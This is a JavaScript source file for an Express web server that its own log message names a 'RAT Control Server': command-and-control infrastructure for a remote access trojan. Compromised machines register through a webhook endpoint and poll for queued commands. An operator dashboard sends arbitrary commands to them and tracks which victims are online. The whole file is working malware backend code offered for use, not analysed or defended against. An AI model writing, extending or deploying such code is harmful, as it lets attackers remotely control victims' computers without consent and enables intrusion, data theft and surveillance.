
const express = require('express');
const path = require('path');
const fs = require('fs').promises;

const app = express();
const PORT = 5000;

// Middleware
app.use(express.json());
app.use(express.static('.'));

// Store registered devices
let registeredDevices = new Set();
let pendingCommands = new Map();
let deviceStatuses = new Map();

// Webhook endpoint to receive device registrations
app.post('/webhook/register', (req, res) => {
    try {
        const content = req.body.content;
        
        if (content && content.startsWith('REGISTRATION:')) {
            const deviceCode = content.replace('REGISTRATION:', '').trim();
            
            if (deviceCode && deviceCode.startsWith('PC') && deviceCode.length >= 8) {
                registeredDevices.add(deviceCode);
                deviceStatuses.set(deviceCode, {
                    lastSeen: new Date(),
                    status: 'online'
                });
                
                console.log(`New device registered: ${deviceCode}`);
                res.status(200).json({ success: true, message: 'Device registered' });
            } else {
                res.status(400).json({ success: false, message: 'Invalid device code' });
            }
        } else {
            res.status(400).json({ success: false, message: 'Invalid registration format' });
        }
    } catch (error) {
        console.error('Registration error:', error);
        res.status(500).json({ success: false, message: 'Server error' });
    }
});

// API endpoint to check for new registrations
app.get('/api/check-registrations', (req, res) => {
    const newCodes = Array.from(registeredDevices);
    res.json({ newCodes });
});

// API endpoint to send commands to devices
app.post('/api/send-command', (req, res) => {
    try {
        const { deviceCode, command } = req.body;
        
        if (!registeredDevices.has(deviceCode)) {
            return res.status(404).json({ success: false, message: 'Device not found' });
        }
        
        // Store command for the device to poll
        if (!pendingCommands.has(deviceCode)) {
            pendingCommands.set(deviceCode, []);
        }
        
        pendingCommands.get(deviceCode).push({
            command,
            timestamp: new Date(),
            id: Math.random().toString(36).substr(2, 9)
        });
        
        res.json({ success: true, message: 'Command queued' });
    } catch (error) {
        console.error('Command error:', error);
        res.status(500).json({ success: false, message: 'Server error' });
    }
});

// API endpoint for devices to poll for commands
app.get('/api/poll-commands/:deviceCode', (req, res) => {
    const deviceCode = req.params.deviceCode;
    
    if (!registeredDevices.has(deviceCode)) {
        return res.status(404).json({ commands: [] });
    }
    
    // Update last seen
    deviceStatuses.set(deviceCode, {
        lastSeen: new Date(),
        status: 'online'
    });
    
    const commands = pendingCommands.get(deviceCode) || [];
    pendingCommands.set(deviceCode, []); // Clear after sending
    
    res.json({ commands });
});

// API endpoint to get device status
app.get('/api/device-status/:deviceCode', (req, res) => {
    const deviceCode = req.params.deviceCode;
    const status = deviceStatuses.get(deviceCode);
    
    if (!status) {
        return res.status(404).json({ found: false });
    }
    
    // Check if device is still online (last seen within 5 minutes)
    const isOnline = (new Date() - status.lastSeen) < 300000;
    
    res.json({
        found: true,
        status: isOnline ? 'online' : 'offline',
        lastSeen: status.lastSeen
    });
});

// Serve main pages
app.get('/', (req, res) => {
    res.sendFile(path.join(__dirname, 'index.html'));
});

app.get('/control', (req, res) => {
    res.sendFile(path.join(__dirname, 'control.html'));
});

// Start server
app.listen(PORT, '0.0.0.0', () => {
    console.log(`RAT Control Server running on port ${PORT}`);
    console.log('Webhook registration endpoint: /webhook/register');
    console.log('Web interface: /');
});

// Clean up offline devices periodically
setInterval(() => {
    const now = new Date();
    for (const [deviceCode, status] of deviceStatuses.entries()) {
        // Remove devices offline for more than 1 hour
        if ((now - status.lastSeen) > 3600000) {
            registeredDevices.delete(deviceCode);
            deviceStatuses.delete(deviceCode);
            pendingCommands.delete(deviceCode);
            console.log(`Removed offline device: ${deviceCode}`);
        }
    }
}, 300000); // Check every 5 minutes
